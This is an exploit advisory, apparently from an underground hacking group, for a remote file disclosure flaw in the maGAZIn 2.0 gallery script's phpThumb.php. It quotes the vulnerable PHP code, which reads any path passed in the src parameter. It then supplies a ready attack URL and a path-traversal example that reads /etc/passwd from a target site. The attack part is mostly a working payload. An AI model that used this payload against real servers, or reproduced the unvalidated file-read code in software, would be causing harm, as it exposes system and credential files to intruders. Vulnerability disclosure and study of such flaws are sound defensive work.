maGAZIn 2.0 (phpThumb.php src) Remote File Disclosure Vulnerability
===================================================================



        \\\|///
      \\  - -  //
       (  @ @ )
----oOOo--(_)-oOOo---------------------------------------------------

[ Y! Underground Group ]

----ooooO-----Ooooo--------------------------------------------------
    (   )     (   )
     \ (       ) /
      \_)     (_/

---------------------------------------------------------------------

[!] Portal   :   maGAZIn v2.0
[!] Download :   http://www.pinkcrow.net/Scripts/gallery.php
[!] Type     :   Remote File Disclosure Vulnerability

---------------------------------------------------------------------

---------------------------------------------------------------------

Vuln Code :  Line (152 - 157)

[Code]
if ($fp = @fopen($_SERVER[&#039;DOCUMENT_ROOT&#039;].$_REQUEST[&#039;src&#039;], &#039;rb&#039;)) {
		$OriginalImageData = fread($fp, filesize($_SERVER[&#039;DOCUMENT_ROOT&#039;].$_REQUEST[&#039;src&#039;]));
		fclose($fp);
	} else {
		ErrorImage(&#039;cannot open &#039;.$_SERVER[&#039;DOCUMENT_ROOT&#039;].$_REQUEST[&#039;src&#039;], 400, 50);
	}
[/Code]

---------------------------------------------------------------------

---------------------------------------------------------------------

Bug :

http://[Target]/[Path]/phpThumb.php?src=[Local File]

Example :

http://Target.ir/Gallery/phpThumb.php?src=../../../etc/passwd

---------------------------------------------------------------------



